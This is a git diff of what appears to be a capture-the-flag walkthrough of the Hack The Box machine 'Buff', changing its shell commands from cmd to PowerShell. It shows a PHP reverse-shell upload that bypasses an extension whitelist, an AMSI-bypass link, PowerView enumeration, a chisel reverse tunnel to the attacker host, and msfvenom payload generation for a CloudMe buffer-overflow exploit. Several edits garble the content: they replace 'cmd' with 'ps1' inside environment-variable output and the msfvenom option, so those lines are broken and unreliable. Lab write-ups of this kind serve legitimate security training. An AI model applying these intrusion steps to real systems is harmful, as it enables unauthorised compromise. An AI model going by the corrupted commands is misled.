@@ -172,7 +172,7 @@ First, I'll setup a listener to receive the shell.
 listening on [any] 9001 ...
 ```
 
-Now, let's create the PHP file to get the reverse shell. I'm going to use the 'PHP Ivan Sincek' one from the last website, configured to use a `cmd` shell. The payload is more than 100 lines long, so I won't include it here.
+Now, let's create the PHP file to get the reverse shell. I'm going to use the 'PHP Ivan Sincek' one from the last website, configured to use a `powershell` shell. The payload is more than 100 lines long, so I won't include it here.
 
 Let's save it as `/workspace/revshell.php.png` to bypass the file extension whitelist.
 
@@ -201,6 +201,8 @@ C:\xampp\htdocs\gym\upload>
 
 We got a shell!
 
+It's a standard one though, so I'll transform it into a Powershell session.
+
 # Local enumeration
 
 If we run `whoami`, we see that we got a foothold as `shaun`.
@@ -209,8 +211,8 @@ If we run `whoami`, we see that we got a foothold as `shaun`.
 
 Let's gather some information about the Windows version of Buff.
 
-```cmd
-C:\xampp\htdocs\gym\upload> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
+```ps1
+PS C:\xampp\htdocs\gym\upload> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
 ```
 
 ```
@@ -220,8 +222,8 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
 
 Okay, so this is Windows 10!
 
-```cmd
-C:\xampp\htdocs\gym\upload> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
+```ps1
+PS C:\xampp\htdocs\gym\upload> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
 ```
 
 ```
@@ -237,8 +239,8 @@ This version of Windows is somewhat recent, but maybe there are missing hotfixes
 
 What is Buff's architecture?
 
-```cmd
-C:\xampp\htdocs\gym\upload> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
+```ps1
+PS C:\xampp\htdocs\gym\upload> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
 ```
 
 ```
@@ -252,8 +254,8 @@ So this system is using x64. This will be useful to know if we want to compile o
 
 Let's check if Windows Defender is enabled.
 
-```cmd
-C:\xampp\htdocs\gym\upload> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /v ProductStatus
+```ps1
+PS C:\xampp\htdocs\gym\upload> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /v ProductStatus
 ```
 
 ```
@@ -267,22 +269,22 @@ It's disabled! That's great, it will make our life easier.
 
 Let's check if there's any AMSI provider.
 
-```cmd
-C:\xampp\htdocs\gym\upload> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers"
+```ps1
+PS C:\xampp\htdocs\gym\upload> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers"
 ```
 
 ```
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
 ```
 
-So there's an AMSI provider. This will be a problem if we want to transfer our binaries to Buff, as it will block them.
+So there's an AMSI provider. This will be a problem if we want to transfer our binaries to Buff, as it will block them. Therefore, I'll use [this Powershell script](https://gist.githubusercontent.com/D3Ext/bf57673644ba08e729f65892e0dae6c4/raw/6c01685b69d2f35b5deb366e0bfdf2f6f31e11bc/amsi-patch.ps1) to bypass it.
 
 ## Firewall
 
 Let's see which Windows Firewall policies profiles are enabled.
 
-```cmd
-C:\xampp\htdocs\gym\upload> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s /v EnableFirewall
+```ps1
+PS C:\xampp\htdocs\gym\upload> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s /v EnableFirewall
 ```
 
 ```
@@ -304,8 +306,8 @@ Okay, so all Firewall profiles are enabled. It shouldn't hinder our progression 
 
 Let's gather the list of connected NICs.
 
-```cmd
-C:\xampp\htdocs\gym\upload> ipconfig /all
+```ps1
+PS C:\xampp\htdocs\gym\upload> ipconfig /all
 ```
 
 ```
@@ -347,10 +349,10 @@ Looks like there's a single network.
 
 ## Local users
 
-Let's enumerate all local users using an obfuscated version of `PowerView`.
+Let's enumerate all local users using `PowerView`.
 
-```cmd
-C:\xampp\htdocs\gym\upload> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetLocalGroupMember -GroupName Users | Where-Object { $_.MemberName -notmatch 'NT AUTHORITY' } | Select-Object GroupName, MemberName, SID | Format-Table"
+```ps1
+PS C:\xampp\htdocs\gym\upload> Get-NetLocalGroupMember -GroupName Users | Where-Object { $_.MemberName -notmatch 'NT AUTHORITY' } | Select-Object GroupName, MemberName, SID | Format-Table
 ```
 
 ```
@@ -363,10 +365,10 @@ It looks like there's only us, `shaun`.
 
 ## Local groups
 
-Let's enumerate all local groups, once again using an obfuscated version of `PowerView`.
+Let's enumerate all local groups, once again using `PowerView`.
 
-```cmd
-C:\xampp\htdocs\gym\upload> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetLocalGroup | Select-Object GroupName, Comment | Format-Table | Out-String -Width 4096"
+```ps1
+PS C:\xampp\htdocs\gym\upload> Get-NetLocalGroup | Select-Object GroupName, Comment | Format-Table | Out-String -Width 4096
 ```
 
 ```
@@ -399,8 +401,8 @@ Looks classic.
 
 Let's gather more information about us.
 
-```cmd
-C:\xampp\htdocs\gym\upload> net user shaun
+```ps1
+PS C:\xampp\htdocs\gym\upload> net user shaun
 ```
 
 ```
@@ -437,8 +439,8 @@ We don't belong to interesting groups.
 
 If we check our home folder, we find the user flag on our Desktop. Let's retrieve its content.
 
-```cmd
-C:\xampp\htdocs\gym\upload> type C:\Users\shaun\Desktop\user.txt
+```ps1
+PS C:\xampp\htdocs\gym\upload> type $env:USERPROFILE\Desktop\user.txt
 ```
 
 ```
@@ -447,16 +449,16 @@ C:\xampp\htdocs\gym\upload> type C:\Users\shaun\Desktop\user.txt
 
 However, we also notice an unusual file in the `Downloads` folder:
 
-```cmd
-C:\xampp\htdocs\gym\upload> dir C:\Users\shaun\Downloads
+```ps1
+PS C:\xampp\htdocs\gym\upload> dir $env:USERPROFILE\Downloads -Force
 ```
 
 ```
 <SNIP>
-14/07/2020  12:27    <DIR>          .
-14/07/2020  12:27    <DIR>          ..
-16/06/2020  15:26        17,830,824 CloudMe_1112.exe
-<SNIP>
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       16/06/2020     16:26       17830824 CloudMe_1112.exe                                                      
+-a-hs-       16/06/2020     22:21            282 desktop.ini
 ```
 
 There's a `CloudMe_1112.exe` file. Let's keep that in mind.
@@ -471,8 +473,8 @@ Let's now focus on our tokens.
 
 Which security groups are associated with our access tokens?
 
-```cmd
-C:\xampp\htdocs\gym\upload> whoami /groups
+```ps1
+PS C:\xampp\htdocs\gym\upload> whoami /groups
 ```
 
 ```
@@ -497,8 +499,8 @@ Unfortunately, there's nothing that we can abuse.
 
 What about the privileges associated with our access tokens?
 
-```cmd
-C:\xampp\htdocs\gym\upload> whoami /priv
+```ps1
+PS C:\xampp\htdocs\gym\upload> whoami /priv
 ```
 
 ```
@@ -518,10 +520,10 @@ There's nothing that we can leverage to elevate our privileges.
 
 ## Shares
 
-Let's list the SMB shares available on Buff, using the same encoded version of `PowerView` as before.
+Let's list the SMB shares available on Buff, using the same version of `PowerView` as before.
 
-```cmd
-C:\xampp\htdocs\gym\upload> powershell -command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted; Import-Module C:\tmp\PowerView.ps1; Get-NetShare | Select-Object Name, Remark | Format-Table"
+```ps1
+PS C:\xampp\htdocs\gym\upload> Get-NetShare | Select-Object Name, Remark | Format-Table
 ```
 
 ```
@@ -538,26 +540,26 @@ So there's only default administrative shares.
 
 Let's check the environment variables for our shell. Maybe we'll find something out of the ordinary?
 
-```cmd
-C:\xampp\htdocs\gym\upload> set
+```ps1
+PS C:\xampp\htdocs\gym\upload> Get-ChildItem Env: | ForEach-Object { "$($_.Name)=$($_.Value)" }
 ```
 
 ```
-C:\xampp\htdocs\gym\upload>set
 ALLUSERSPROFILE=C:\ProgramData
+AP_PARENT_PID=4904
 APPDATA=C:\Users\shaun\AppData\Roaming
 CommonProgramFiles=C:\Program Files\Common Files
 CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
 CommonProgramW6432=C:\Program Files\Common Files
 COMPUTERNAME=BUFF
-ComSpec=C:\Windows\system32\cmd.exe
+ComSpec=C:\Windows\system32\ps1.exe
 DriverData=C:\Windows\System32\Drivers\DriverData
 LOCALAPPDATA=C:\Users\shaun\AppData\Local
 NUMBER_OF_PROCESSORS=4
 OneDrive=C:\Users\shaun\OneDrive
 OS=Windows_NT
 Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\shaun\AppData\Local\Microsoft\WindowsApps
-PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+PATHEXT=.COM;.EXE;.BAT;.ps1;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
 PROCESSOR_ARCHITECTURE=AMD64
 PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
 PROCESSOR_LEVEL=23
@@ -567,7 +569,8 @@ ProgramFiles=C:\Program Files
 ProgramFiles(x86)=C:\Program Files (x86)
 ProgramW6432=C:\Program Files
 PROMPT=$P$G
-PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSExecutionPolicyPreference=Unrestricted
+PSModulePath=C:\Users\shaun\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
 PUBLIC=C:\Users\Public
 SystemDrive=C:
 SystemRoot=C:\Windows
@@ -577,7 +580,6 @@ USERDOMAIN=BUFF
 USERNAME=shaun
 USERPROFILE=C:\Users\shaun
 windir=C:\Windows
-AP_PARENT_PID=6540
 ```
 
 There's nothing interesting.
@@ -586,8 +588,8 @@ There's nothing interesting.
 
 Let's see if any TCP local ports are listening for connections.
 
-```cmd
-C:\xampp\htdocs\gym\upload> netstat -ano | findstr /C:"LISTENING" | findstr /C:"TCP"
+```ps1
+PS C:\xampp\htdocs\gym\upload> netstat -ano | findstr /C:"LISTENING" | findstr /C:"TCP"
 ```
 
 ```
@@ -623,14 +625,14 @@ We notice that the port `3306/tcp` is listening, which corresponds to MySQL. It 
 
 Let's see which process uses the PID associated with this port.
 
-```cmd
-C:\xampp\htdocs\gym\upload> for /f "tokens=5" %a in ('netstat -ano ^| findstr "8888"') do @tasklist /fi "pid eq %a"
+```ps1
+PS C:\xampp\htdocs\gym\upload> Get-Process -Id (netstat -ano | Select-String -Pattern "8888" | ForEach-Object { $_ -split '\s+' } | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne '' } | Select-Object -Last 1)
 ```
 
 ```
-Image Name                     PID Session Name        Session#    Mem Usage
-========================= ======== ================ =========== ============
-CloudMe.exe                   5404                            0     37,436 K
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
+------  ------    -----      -----     ------     --  -- -----------                                                  
+    366      25    31972      38500              4140   0 CloudMe
 ```
 
 This `CloudMe` program again! So it's running on this machine. This must be the same version as the one we found in the `Downloads` folder. Let's search online for vulnerabilities affecting this version.
@@ -659,8 +661,8 @@ I'll transfer `chisel` for Windows on the machine, and then I'll start the serve
 
 And then on Buff:
 
-```cmd
-C:\xampp\htdocs\gym\upload> C:\tmp\chisel.exe client 10.10.14.5:8000 R:8888:127.0.0.1:8888
+```ps1
+PS C:\xampp\htdocs\gym\upload> C:\tmp\chisel.exe client 10.10.14.5:8000 R:8888:127.0.0.1:8888
 ```
 
 ```
@@ -670,7 +672,7 @@ C:\xampp\htdocs\gym\upload> C:\tmp\chisel.exe client 10.10.14.5:8000 R:8888:127.
 
 Alright, so now we should have access to CloudMe from our own machine.
 
-However, according to the exploit's payload comment, it was obtained by running `msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python`. So right now, it executes `calc.exe`, but that's not what we want. We want to obtain a reverse shell.
+However, according to the exploit's payload comment, it was obtained by running `msfvenom -a x86 -p windows/exec ps1=calc.exe -b '\x00\x0A\x0D' -f python`. So right now, it executes `calc.exe`, but that's not what we want. We want to obtain a reverse shell.
 
 ```sh
 ❯ rlwrap nc -lvnp 9002
@@ -752,6 +754,8 @@ C:\Windows\system32>
 
 We received a connection! Yay!
 
+It's a standard one though, so I'll transform it into a Powershell session.
+
 If we run `whoami`, we can confirm that we are `NT AUTHORITY\SYSTEM`!
 
 # Local enumeration
@@ -760,8 +764,8 @@ If we run `whoami`, we can confirm that we are `NT AUTHORITY\SYSTEM`!
 
 The only thing we need to do to finish this box is to retrieve the root flag. As usual, we can find it on our Desktop!
 
-```cmd
-C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+```ps1
+PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
 ```
 
 ```
